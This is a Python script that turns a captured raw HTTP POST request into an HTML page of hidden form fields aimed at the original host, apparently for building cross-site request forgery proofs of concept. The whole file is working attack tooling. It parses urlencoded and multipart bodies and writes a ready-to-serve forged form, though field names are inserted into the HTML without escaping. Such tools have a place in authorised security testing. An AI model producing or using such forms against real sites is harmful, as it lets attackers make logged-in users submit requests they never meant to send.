import sys
import argparse
import re
from urllib.parse import parse_qsl

def parse_http_request(raw_request: str):
    lines = raw_request.strip().splitlines()
    request_line = lines[0]
    method, path, _ = request_line.split()

    headers = {}
    body = ""
    is_body = False

    for line in lines[1:]:
        if line.strip() == "":
            is_body = True
            continue
        if is_body:
            body += line + "\n"
        else:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()

    return method, path, headers, body.strip()

def extract_multipart_fields(body: str, boundary: str):
    fields = []
    boundary = boundary.strip('"')
    parts = body.split(f'--{boundary}')
    for part in parts:
        part = part.strip()
        if not part or part == '--':
            continue
        name_match = re.search(r'name="([^"]+)"', part)
        if not name_match:
            continue
        name = name_match.group(1)

        # Extract value after header
        value = ""
        if "\r\n\r\n" in part:
            value = part.split("\r\n\r\n", 1)[1].strip()
        elif "\n\n" in part:
            value = part.split("\n\n", 1)[1].strip()
        else:
            lines = part.splitlines()
            if len(lines) > 1:
                value = lines[-1].strip()
        fields.append((name, value))
    return fields

def generate_html_form(action: str, fields: list) -> str:
    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>CSRF Form</title></head>
<body>
<form action="{action}" method="POST">\n"""
    for name, value in fields:
        value = value.replace('"', "&quot;")  # Escape quotes
        html += f'  <input type="hidden" name="{name}" value="{value}">\n'
    html += '  <button type="submit">CSRF</button>\n</form>\n</body>\n</html>'
    return html

def main():
    parser = argparse.ArgumentParser(description="Generate CSRF HTML form from raw HTTP request")
    parser.add_argument("-o", help="Output filename (default: csrf.html)", default="csrf.html")
    parser.add_argument("-f", "--file", help="Input file containing raw HTTP request")
    args = parser.parse_args()

    if args.file:
        with open(args.file, "r") as infile:
            raw_request = infile.read()
    else:
        try:
            print("Paste the raw HTTP request and press Ctrl+D (or Ctrl+Z on Windows):")
            raw_request = sys.stdin.read()
        except KeyboardInterrupt:
            print("\nInterrupted by user. Exiting.")
            sys.exit(0)

    method, path, headers, body = parse_http_request(raw_request)
    content_type = headers.get("Content-Type", "")
    host = headers.get("Host", "localhost")
    action = f"https://{host}{path}"

    if method.upper() != "POST":
        print("\nOnly POST requests are supported.")
        return

    if "application/json" in content_type:
        print("\nCannot generate HTML form for JSON content.")
        return

    elif "multipart/form-data" in content_type:
        boundary_match = re.search(r'boundary=(.+)', content_type)
        if not boundary_match:
            print("Boundary not found in multipart data.")
            return
        boundary = boundary_match.group(1)
        fields = extract_multipart_fields(body, boundary)

    elif "application/x-www-form-urlencoded" in content_type:
        fields = parse_qsl(body)
    
    elif "application/x-www-formurlencoded" in content_type:
        fields = parse_qsl(body)
    
    elif "application/www-formurlencoded" in content_type:
        fields = parse_qsl(body)
    
    elif "application/www-form-urlencoded" in content_type:
        fields = parse_qsl(body)

    else:
        print("Unsupported content type.")
        return

    html = generate_html_form(action, fields)
    with open(args.o, "w") as f:
        f.write(html)

    print(f"\nForm saved as: {args.o}")

if __name__ == "__main__":
    main()
